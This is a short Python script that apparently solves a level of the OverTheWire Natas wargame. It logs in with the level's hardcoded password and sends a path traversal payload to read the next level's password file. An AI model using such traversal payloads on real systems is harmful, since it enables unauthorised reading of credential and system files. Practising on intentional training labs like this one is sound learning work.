import requests
import re 

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
url = 'http://%s.natas.labs.overthewire.org/index.php' % username

payload = {'page': '../../../../etc/natas_webpass/natas8'}

session = requests.Session()

response = session.get(url, auth=(username, password), params=payload)

print(response.text)